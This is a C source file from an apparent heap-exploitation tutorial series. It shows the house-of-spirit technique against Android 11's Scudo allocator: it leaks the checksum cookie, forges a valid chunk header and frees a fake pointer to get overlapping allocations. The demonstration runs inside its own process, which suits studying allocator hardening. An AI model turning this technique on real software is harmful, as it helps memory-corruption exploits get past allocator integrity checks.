#define _GNU_SOURCE

#include "target.h"

#include <android/log.h>

#include <link.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * House-of-spirit demonstration for Android 11 AArch64 libc build ID
 * 47a9ba0d54d9614053e13adab1207062.
 * Inspired by: https://github.com/shellphish/how2heap
 *
 * Starting primitives modeled by this demonstration:
 *   - disclosure of the Scudo cookie and libc base;
 *   - control of aligned primary-region memory for a fake chunk header; and
 *   - the ability to pass the corresponding fake user pointer to free().
 *
 * Result demonstrated:
 *   - malloc(0x10) returns an address inside a still-live backing allocation,
 *     creating overlapping allocations.
 *
 * Android 11 stores full pointers in its PerClass cache. Unlike the compact
 * offset configuration used by later AArch64 releases, the fake block does not
 * need to be representable relative to the class-1 primary-region base.
 */

enum {
    kClassIdShift = 0,
    kStateShift = 8,
    kOriginShift = 10,
    kSizeOrUnusedBytesShift = 12,
    kOffsetShift = 32,
    kChecksumShift = 48,
    kBackingRequestSize = 0x20,
};

static const char kLogTag[] = "HOW2SCUDO_HOS";
static uintptr_t g_libc_base;

_Static_assert(sizeof(uintptr_t) == 8, "this PoC requires a 64-bit ABI");
_Static_assert(HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE == 0x10U,
               "unexpected combined-header size");
_Static_assert(HOW2SCUDO_TARGET_PRIMARY_ENTRY_BITS == 64U,
               "this source models raw 64-bit PerClass pointers");

__attribute__((format(printf, 3, 4))) static void
log_message(int priority, FILE *stream, const char *format, ...) {
    va_list arguments;
    va_start(arguments, format);

    va_list android_arguments;
    va_copy(android_arguments, arguments);
    __android_log_vprint(priority, kLogTag, format, android_arguments);
    va_end(android_arguments);

    fprintf(stream, "[%s] ", kLogTag);
    vfprintf(stream, format, arguments);
    fputc('\n', stream);
    fflush(stream);
    va_end(arguments);
}

#define LOGI(...) log_message(ANDROID_LOG_INFO, stdout, __VA_ARGS__)
#define LOGE(...) log_message(ANDROID_LOG_ERROR, stderr, __VA_ARGS__)

static uintptr_t untag(uintptr_t value) {
    return value & HOW2SCUDO_TARGET_ADDRESS_MASK;
}

static int find_libc(struct dl_phdr_info *info, size_t size, void *data) {
    (void)size;
    (void)data;

    if (info->dlpi_name != NULL &&
        strstr(info->dlpi_name, "/libc.so") != NULL) {
        g_libc_base = (uintptr_t)info->dlpi_addr;
        return 1;
    }
    return 0;
}

static bool locate_libc(void) {
    g_libc_base = 0;
    dl_iterate_phdr(find_libc, NULL);
    return g_libc_base != 0;
}

static uint32_t leak_scudo_cookie(void) {
    uintptr_t address = g_libc_base + HOW2SCUDO_TARGET_SCUDO_COOKIE_OFFSET;
    return *(volatile uint32_t *)address;
}

static uint32_t crc32_u64(uint32_t crc, uint64_t value) {
    crc ^= (uint32_t)value;
    for (int bit = 0; bit < 32; ++bit) {
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & UINT32_C(1)));
    }

    crc ^= (uint32_t)(value >> 32);
    for (int bit = 0; bit < 32; ++bit) {
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & UINT32_C(1)));
    }
    return crc;
}

static uint16_t scudo_header_checksum(uintptr_t user_pointer,
                                      uint64_t packed_header, uint32_t cookie) {
    uint32_t crc = crc32_u64(cookie, user_pointer);
    crc = crc32_u64(crc, packed_header & UINT64_C(0x0000ffffffffffff));
    return (uint16_t)(crc ^ (crc >> 16));
}

static uintptr_t header_pointer_for_checksum(const void *pointer) {
    return untag((uintptr_t)pointer) | HOW2SCUDO_TARGET_SCUDO_HEADER_TAG;
}

static uint64_t build_allocated_header(unsigned class_id, uint16_t checksum) {
    uint64_t header = 0;
    header |= (uint64_t)class_id << kClassIdShift;
    header |= UINT64_C(1) << kStateShift;
    header |= UINT64_C(0) << kOriginShift;
    header |= UINT64_C(0) << kSizeOrUnusedBytesShift;
    header |= UINT64_C(0) << kOffsetShift;
    header |= (uint64_t)checksum << kChecksumShift;
    return header;
}

static uint64_t read_header_before(const void *user_pointer) {
    uint64_t header = 0;
    uintptr_t header_address =
        untag((uintptr_t)user_pointer) - HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE;
    memcpy(&header, (const void *)header_address, sizeof(header));
    return header;
}

int how2scudo_run(void) {
    LOGI("=== Android 11 house of spirit tutorial ===");
    LOGI("Goal: forge a valid class-1 block inside a live primary allocation, "
         "free it into the raw-pointer PerClass cache, and create an overlap.");
    LOGI("Target: API %u, ABI %s, exact libc build ID %s.",
         HOW2SCUDO_TARGET_ANDROID_API, HOW2SCUDO_TARGET_ABI,
         HOW2SCUDO_TARGET_LIBC_BUILD_ID);
    LOGI("Success condition: malloc(0x%x) returns the chosen interior address.",
         HOW2SCUDO_TARGET_SMALLEST_PRIMARY_REQUEST_SIZE);

    LOGI("[1/6] Locate libc and disclose the Scudo checksum cookie.");
    if (!locate_libc()) {
        LOGE("[1/6] Failed: could not locate libc.so.");
        return 1;
    }
    uint32_t cookie = leak_scudo_cookie();
    LOGI("[1/6] libc base: 0x%zx; cookie at +0x%zx: 0x%08x",
         (size_t)g_libc_base,
         (size_t)HOW2SCUDO_TARGET_SCUDO_COOKIE_OFFSET, cookie);

    LOGI("[2/6] Confirm malloc(0x10) selects class 1.");
    void *probe = malloc(HOW2SCUDO_TARGET_SMALLEST_PRIMARY_REQUEST_SIZE);
    if (probe == NULL) {
        LOGE("[2/6] Failed: class probe returned null.");
        return 2;
    }
    uint64_t probe_header = read_header_before(probe);
    unsigned observed_class =
        (unsigned)((probe_header >> kClassIdShift) & UINT64_C(0xff));
    unsigned observed_state =
        (unsigned)((probe_header >> kStateShift) & UINT64_C(0x3));
    LOGI("[2/6] probe=%p header=0x%016llx ClassId=%u State=%u", probe,
         (unsigned long long)probe_header, observed_class, observed_state);
    if (observed_class != HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID ||
        observed_state != 1U) {
        LOGE("[2/6] Failed: runtime class layout does not match the target.");
        return 3;
    }

    LOGI("[3/6] Allocate a still-live 0x%x-byte backing object.",
         kBackingRequestSize);
    unsigned char *backing = (unsigned char *)malloc(kBackingRequestSize);
    if (backing == NULL) {
        LOGE("[3/6] Failed: backing allocation returned null.");
        return 4;
    }
    unsigned backing_class = (unsigned)(
        (read_header_before(backing) >> kClassIdShift) & UINT64_C(0xff));
    if (backing_class == 0U) {
        LOGE("[3/6] Failed: backing storage unexpectedly used the secondary.");
        return 4;
    }
    memset(backing, 0, kBackingRequestSize);
    void *fake_header = (void *)untag((uintptr_t)backing);
    void *fake_user = backing + HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE;
    LOGI("[3/6] backing=%p ClassId=%u", (void *)backing, backing_class);
    LOGI("[3/6] fake header=%p; chosen fake user=%p", fake_header, fake_user);
    LOGI("Android 11 stores this block address directly in PerClass; there is "
         "no region-relative representability constraint.");

    LOGI("[4/6] Forge an allocated class-1 header with a valid checksum.");
    uint64_t header_without_checksum = build_allocated_header(
        HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID, 0);
    uintptr_t checksum_pointer = header_pointer_for_checksum(fake_user);
    uint16_t checksum = scudo_header_checksum(
        checksum_pointer, header_without_checksum, cookie);
    uint64_t forged_header = build_allocated_header(
        HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID, checksum);
    memcpy(fake_header, &forged_header, sizeof(forged_header));
    LOGI("[4/6] checksum pointer=0x%zx; forged header=0x%016llx",
         (size_t)checksum_pointer, (unsigned long long)forged_header);
    LOGI("This Android 11 Scudo build strips the top-byte heap tag before "
         "checking the header, so the checksum uses the untagged address.");

    LOGI("[5/6] Free the controlled interior pointer into class 1.");
    free(fake_user);
    LOGI("[5/6] free() returned without a Scudo abort.");
    void *returned = malloc(HOW2SCUDO_TARGET_SMALLEST_PRIMARY_REQUEST_SIZE);
    if (returned == NULL) {
        LOGE("[5/6] Failed: follow-up allocation returned null.");
        return 5;
    }

    LOGI("[6/6] returned=%p; chosen=%p", returned, fake_user);
    if (untag((uintptr_t)returned) != untag((uintptr_t)fake_user)) {
        LOGE("[6/6] Failed: allocator did not return the chosen address.");
        return 6;
    }
    memcpy(returned, "spirit", sizeof("spirit"));
    LOGI("[6/6] SUCCESS: fake user storage now contains '%s'.",
         (char *)returned);
    LOGI("Demonstrated primitive: malloc returned an address inside a still-"
         "live allocation. This is an overlap, not code execution.");
    return 0;
}

#ifdef HOW2SCUDO_STANDALONE
int main(void) { return how2scudo_run(); }
#endif
